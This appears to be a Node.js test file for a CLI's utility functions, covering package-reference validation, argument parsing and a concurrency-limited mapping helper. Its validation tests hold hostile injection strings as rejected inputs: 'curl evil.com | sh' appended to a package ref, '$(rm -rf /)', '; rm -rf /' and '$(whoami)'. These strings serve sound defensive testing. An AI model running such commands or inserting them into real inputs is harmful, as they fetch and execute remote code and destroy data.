import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { VALID_DECISIONS, isSafePackageRef, HELP_TEXT, PACKAGE_VERSION, parseArgs, mapLimit } from "../src/utils.js";

const pkg = createRequire(import.meta.url)("../package.json");

test("VALID_DECISIONS holds exactly the five legal tokens", () => {
  assert.deepEqual([...VALID_DECISIONS].sort(), ["BUILD", "DEFER", "EXTEND", "REJECT", "REUSE"]);
});

test("isSafePackageRef accepts clean refs and rejects injection", () => {
  assert.equal(isSafePackageRef("user/repo"), true);
  assert.equal(isSafePackageRef("user/repo@1.2.0"), true);
  assert.equal(isSafePackageRef("scope-x/skill-name@v2.1.0"), true);

  assert.equal(isSafePackageRef("this repo"), false);
  assert.equal(isSafePackageRef("legit/skill@1.0.0 && curl evil.com | sh"), false);
  assert.equal(isSafePackageRef("$(rm -rf /)"), false);
  assert.equal(isSafePackageRef("no-slash"), false);
  assert.equal(isSafePackageRef(null), false);
  assert.equal(isSafePackageRef(""), false);
});

test("isSafePackageRef accepts scoped refs but still rejects injection", () => {
  assert.equal(isSafePackageRef("@org/repo"), true);
  assert.equal(isSafePackageRef("@org/repo@1.2.3"), true);
  assert.equal(isSafePackageRef("@scope-x.y/skill_name@v2.1.0"), true);

  assert.equal(isSafePackageRef("@org/repo && curl evil.com | sh"), false);
  assert.equal(isSafePackageRef("@org/repo@1.2.3; rm -rf /"), false);
  assert.equal(isSafePackageRef("@ org/repo"), false);
  assert.equal(isSafePackageRef("@@org/repo"), false);
  assert.equal(isSafePackageRef("@org/$(whoami)"), false);
  assert.equal(isSafePackageRef("@org"), false);
});

test("HELP_TEXT derives its version line from package.json (no dual bump site)", () => {
  assert.equal(PACKAGE_VERSION, pkg.version);
  assert.ok(HELP_TEXT.includes(`SKILL MINING CLI v${pkg.version}`));
});

test("parseArgs handles --version, --out-dir, and --dry-run", () => {
  const base = ["node", "cli.js"];

  assert.equal(parseArgs([...base, "-v"]).version, true);
  assert.equal(parseArgs([...base, "--version"]).version, true);
  assert.equal(parseArgs([...base]).version, false);

  assert.equal(parseArgs([...base]).outDir, ".agents");
  assert.equal(parseArgs([...base, "--out-dir", "tools/skills"]).outDir, "tools/skills");
  assert.equal(parseArgs([...base, "--out-dir=custom"]).outDir, "custom");
  // Everything after the FIRST "=" is the value — "=" is legal in dir names
  assert.equal(parseArgs([...base, "--out-dir=build=artifacts"]).outDir, "build=artifacts");
  // A dangling --out-dir must not leave the artifact root undefined
  assert.equal(parseArgs([...base, "--out-dir"]).outDir, ".agents");

  assert.equal(parseArgs([...base, "--dry-run"]).dryRun, true);
  assert.equal(parseArgs([...base]).dryRun, false);
});

test("mapLimit preserves input order even when later items finish first", async () => {
  const delays = [30, 0, 15];
  const result = await mapLimit(delays, 3, async (ms, i) => {
    await new Promise((r) => setTimeout(r, ms));
    return `${i}:${ms}`;
  });
  assert.deepEqual(result, ["0:30", "1:0", "2:15"]);
});

test("mapLimit never exceeds the concurrency limit", async () => {
  let inFlight = 0;
  let maxInFlight = 0;
  await mapLimit([1, 2, 3, 4, 5, 6], 2, async () => {
    inFlight++;
    maxInFlight = Math.max(maxInFlight, inFlight);
    await new Promise((r) => setTimeout(r, 5));
    inFlight--;
  });
  assert.equal(maxInFlight, 2, "with 6 items and limit 2 the window must fill but never overflow");
});

test("mapLimit error isolation: a catch inside fn resolves that slot; an uncaught throw rejects the call", async () => {
  // Callers that must not let one item abort siblings catch INSIDE fn — the
  // slot then resolves with the degraded value and the others are untouched.
  const result = await mapLimit([1, 2, 3], 2, async (n) => {
    try {
      if (n === 2) throw new Error("boom");
      return n;
    } catch (err) {
      return `caught:${err.message}`;
    }
  });
  assert.deepEqual(result, [1, "caught:boom", 3]);

  // Without a catch inside fn, the rejection propagates to the caller.
  await assert.rejects(
    () => mapLimit([1, 2], 2, async (n) => {
      if (n === 2) throw new Error("boom");
      return n;
    }),
    /boom/
  );
});

test("mapLimit handles an empty list and passes the item index to fn", async () => {
  assert.deepEqual(await mapLimit([], 4, async () => 1), []);
  assert.deepEqual(await mapLimit(["a", "b"], 1, async (item, i) => `${item}${i}`), ["a0", "b1"]);
});
